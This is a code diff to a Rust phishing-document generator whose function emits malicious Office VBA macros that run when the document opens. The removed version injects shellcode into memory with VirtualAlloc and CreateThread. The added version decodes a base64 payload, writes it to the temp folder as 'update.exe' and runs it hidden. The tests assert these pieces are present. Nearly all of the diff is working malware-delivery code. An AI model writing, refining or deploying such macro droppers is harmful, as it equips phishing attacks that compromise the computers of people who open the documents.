@@ -48,33 +48,54 @@ impl PhishingGenerator {
     }
 
     pub fn generate_macro_vba(payload: &[u8]) -> String {
-        let mut vba = String::from(
-            r#"
-Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
-Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
-Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
-
-Sub AutoOpen()
-"#,
-        );
-        vba.push_str("    Dim code() As Byte\n");
-        vba.push_str(&format!("    ReDim code({})\n", payload.len() - 1));
-
-        // Chunk bytes to avoid huge lines
-        for (i, byte) in payload.iter().enumerate() {
-            vba.push_str(&format!("    code({}) = {}\n", i, byte));
+        let b64 = general_purpose::STANDARD.encode(payload);
+        let mut chunks = String::new();
+        
+        for chunk in b64.as_bytes().chunks(80) {
+            let s = std::str::from_utf8(chunk).unwrap();
+            chunks.push_str(&format!("    payload = payload & \"{}\"\n", s));
         }
 
-        vba.push_str(
+        format!(
             r#"
-    Dim addr As LongPtr
-    addr = VirtualAlloc(0, UBound(code) + 1, &H1000, &H40)
-    RtlMoveMemory addr, code(0), UBound(code) + 1
-    CreateThread 0, 0, addr, 0, 0, 0
+Sub AutoOpen()
+    Dim payload As String
+    payload = ""
+{}
+    
+    Dim bytes() As Byte
+    bytes = DecodeBase64(payload)
+    
+    Dim path As String
+    path = Environ("TEMP") & "\update.exe"
+    
+    On Error Resume Next
+    Kill path
+    On Error GoTo 0
+    
+    Dim fileNum As Integer
+    fileNum = FreeFile
+    Open path For Binary As #fileNum
+    Put #fileNum, , bytes
+    Close #fileNum
+    
+    Shell path, vbHide
 End Sub
+
+Function DecodeBase64(ByVal strData As String) As Byte()
+    Dim objXML As Object
+    Dim objNode As Object
+    Set objXML = CreateObject("MSXML2.DOMDocument")
+    Set objNode = objXML.createElement("b64")
+    objNode.DataType = "bin.base64"
+    objNode.Text = strData
+    DecodeBase64 = objNode.nodeTypedValue
+    Set objNode = Nothing
+    Set objXML = Nothing
+End Function
 "#,
-        );
-        vba
+            chunks
+        )
     }
 }
 
@@ -95,10 +116,9 @@ mod tests {
     fn test_macro_vba_generation() {
         let payload = b"\x90\x90";
         let vba = PhishingGenerator::generate_macro_vba(payload);
-        assert!(vba.contains("VirtualAlloc"));
-        assert!(vba.contains("CreateThread"));
-        // 0x90 = 144
-        assert!(vba.contains("code(0) = 144"));
-        assert!(vba.contains("code(1) = 144"));
+        assert!(vba.contains("DecodeBase64"));
+        assert!(vba.contains("Environ(\"TEMP\")"));
+        // Base64 of 0x9090 is kJA=
+        assert!(vba.contains("kJA="));
     }
 }
